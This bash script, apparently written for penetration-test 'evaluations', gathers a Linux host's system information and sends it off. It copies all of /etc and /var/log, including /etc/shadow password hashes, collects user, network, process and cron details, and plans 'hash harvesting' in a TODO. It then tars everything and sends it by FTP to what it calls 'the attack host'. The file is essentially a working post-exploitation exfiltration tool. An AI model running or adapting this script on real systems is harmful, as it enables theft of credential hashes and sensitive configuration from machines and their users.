#!/bin/bash
#**********************************************
#   Linux data collection script.
#   Author Reed
#   Version 0.2b
#   Date 10 Jan 2014
#
#   This script is used to collect system information
#   from Linux systems during evaluations. The
#   collected data is not all-inclusive and should
#   be changed based on the needs of the assesment.
#**********************************************

#**********************************************
#   TODO:   Parse /etc/passwd entries for hash harvesting
#           add command line arguments and interaction
#           check system service directory permissions
#**********************************************

#**********************************************
#   Declare various variables for collection
#   and output formats
#**********************************************
date=`date +%Y.%m.%d-%H%M.%Z`
host=`hostname`
ip=`ifconfig -a | awk /"inet addr"/'{if ( $2 !~ "127.0.0.1") print $2}' |sed -e "s/addr://" | head -1`
PREFIX="$date-$host-$ip"
TEMP="/tmp/VZP"
LOGS="/var/log"
ETCDIR="/etc"
ARCHIVE="$PREFIX.tar"
FTPHOST="127.0.0.1"

#**********************************************
#   Create directories for data collection
#**********************************************
makeDirs() {
mkdir $TEMP
mkdir $TEMP/etc
mkdir $TEMP/state
}
#**********************************************
#   Collect log files and put them in $TEMP/logs
#**********************************************
getLogs() {
cp -R $LOGS $TEMP
dmesg > $TEMP/state/dmesg.txt
}

#**********************************************
#   Collect config files and put them in $TEMP/etc
#**********************************************
getConfigs() {
cp -R $ETCDIR $TEMP
}

#**********************************************
#   Collect kernel version and other system info
#   including currently mounted drives
#**********************************************
getState() {
uname -a >> $TEMP/state/uname.txt
lsb_release -a >> $TEMP/state/lsb_release.txt
mount >> $TEMP/state/mounted_devices.txt
df > $TEMP/state/free_space.txt
ls -l /home > $TEMP/state/home-dirs.txt
whoami > $TEMP/state/whoami.txt
date > $TEMP/state/current-date-time.txt
}

#**********************************************
#   User information from the system
#**********************************************
getUsers() {
USERS=`awk '{ if ($3 > 499) print $1}' FS=":" /etc/passwd`
for user in $USERS; do
	echo $user >> $TEMP/state/user_information.txt && chage -l $user >> $TEMP/state/user_information.txt
done
who > $TEMP/state/who-is-logged-in.txt
cp /etc/passwd $TEMP/state
cp /etc/shadow $TEMP/state
}

#**********************************************
#   Collect network and route info for all devices
#**********************************************
getNet() {
netstat -rn > $TEMP/state/routes.txt
netstat -na | grep LISTEN\   > $TEMP/state/network-pids.txt
netstat -na | grep CONNECTED\   > $TEMP/state/connected-sessions.txt
if [ -x /sbin/ip ]; then
	ip route list table all > $TEMP/state/ip-route-list-table-all.txt
  	ip rule list > $TEMP/state/ip-rule-list.txt
fi
lsof -i > $TEMP/state/lsof-i-network.txt
for table in filter nat mangle raw; do
	iptables -nvL -t $table > $TEMP/state/ip-filter-list-$table.txt
done
arp -a > $TEMP/state/arp-table.txt
ifconfig -a > $TEMP/state/interface-configs.txt
}

#**********************************************
#   Collect installed packages and process lists
#**********************************************
getPackages() {
rpm -qa --last > $TEMP/state/installed-packages.txt                 # package info for RedHat based systems
chkconfig --list | grep ":on" > $TEMP/state/configured-services.txt #
ps axuw --forest > $TEMP/state/process-list.txt
lsof > $TEMP/state/open-files.txt
}

#**********************************************
#   Collect crontab information
#**********************************************
getCron() {
CRONS=`ls /var/spool/cron/* 2> /dev/null`
if [ "$CRONS" != "" ]; then
   for file in $CRONS ; do
	echo $file >> $TEMP/state/crontabs.txt
	cat $file >> $TEMP/state/crontabs.txt
   done
else
   echo "No user crontabs in /var/spool/cron" > $TEMP/state/crontabs.txt
fi
}

#**********************************************
#   Package up $TEMP
#**********************************************
packIt() {
cd $TEMP
tar -cf $ARCHIVE state etc log
}

#**********************************************
#   FTP the package to the attack host
#**********************************************
sendPackage() {
USER='SET_TO_HOST_LOGIN'
PASSWD='SET_TO_USER_PASSWORD'

ftp -n -v $FTPHOST << EOT
user $USER $PASSWD
prompt
binary
put $ARCHIVE
bye
EOT
}

#**********************************************
#   Argument parsing for each function
#   will default to all if no arguments provided
#**********************************************

makeDirs
getLogs
getConfigs
getState
getUsers
getCron
getNet
packIt
sendPackage
echo "Results are in $TEMP"



